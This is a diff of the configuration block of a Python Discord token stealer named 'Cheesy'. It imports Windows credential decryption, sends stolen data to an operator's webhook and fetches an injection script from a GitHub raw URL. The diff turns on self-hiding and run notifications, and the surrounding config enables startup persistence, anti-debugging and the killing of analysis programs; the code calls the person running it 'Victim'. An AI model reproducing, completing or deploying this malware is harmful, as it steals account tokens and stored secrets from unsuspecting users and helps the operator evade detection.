@@ -25,24 +25,24 @@ from win32crypt import CryptUnprotectData
 
 
 __author__ = "bananaman2020"
-__version__ = '1.8.7'
+__version__ = '1.0.4'
 __license__ = "GPL-3.0"
 __config__ = {
     # replace WEBHOOK_HERE with your webhook ↓↓ or use the api from https://github.com/Rdimo/Discord-Webhook-Protector
     # Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
     'webhook': "WEBHOOK_HERE", # Enter your webhook on this line by replacing "WEBHOOK_HERE"
-    # ONLY HAVE THE BASE32 ENCODED KEY HERE IF YOU'RE USING https://github.com/Rdimo/Discord-Webhook-Protector
+    # ONLY HAVE THE BASE32 ENCODED KEY HERE IF YOU'RE USING https://github.com/Rdimo/Discord-Webhook-Protector # Token protector server side broken atm so I'm using the Webhook from the client side
     'webhook_protector_key': "KEY_HERE",
     # keep it as it is unless you want to have a custom one
     'injection_url': "https://raw.githubusercontent.com/bananaman2020/Discord-Injection/master/injection.js",
     # if True, it will ping @everyone when someone ran Cheesy
-    'ping_on_run': False,
+    'ping_on_run': True,
     # set to False if you don't want it to kill programs such as discord upon running the exe
     'kill_processes': False,
     # if you want the file to run at startup
     'startup': True,
     # if you want the file to hide itself after run
-    'hide_self': False,
+    'hide_self': True,
     # does it's best to prevent the program from being debugged and drastically reduces the changes of your webhook being found
     'anti_debug': True,
     # this list of programs will be killed if Cheesy detects that any of these are running, you can add more if you want
@@ -56,7 +56,7 @@ __config__ = {
     ]
 
 # added "code" (VSCode) as it can be used to debug certain python programs with the help of Visual Studio. If you end up having issues just remove "code" from the 'blackListedPrograms' list
-
+  
 }
 # global variables
 Victim = os.getlogin()
